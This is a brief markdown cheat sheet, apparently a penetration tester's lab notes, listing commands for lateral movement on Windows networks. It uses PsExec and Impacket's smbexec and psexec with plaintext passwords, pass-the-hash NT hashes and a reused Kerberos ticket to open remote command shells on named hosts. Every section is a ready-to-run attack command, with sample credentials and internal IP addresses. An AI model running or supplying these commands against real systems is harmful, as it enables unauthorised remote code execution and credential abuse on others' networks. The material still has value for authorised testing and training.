
## PsExec Internally

```
.\PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
```

## If psexec doesn't work even though valid creds

```
impacket-smbexec medtech.com/Administrator:'denZV00Zwtpax57.'@172.16.210.13
```
#### With Hash

```
impacket-psexec -hashes <LM HASH>:<NT HASH> Administrator@10.10.10.16
```

```
impacket-psexec -hashes :323232345630391012 Administrator@10.10.10.16
```
##### With Creds

```
impacket-psexec beyond.com/john:'dqsTwTpZPn#nL'@192.168.202.242
```
##### With Creds, but without domain

```
impacket-psexec beccy:'NiftyTopekaDevolve6655!#!'@172.16.165.240
```

##### With Kerberos Ticket (.kirbi)

```
KRB5CCNAME=ticket.ccache impacket-psexec resourced.local/Administrator@resourcedc.resourced.local -k -no-pass
```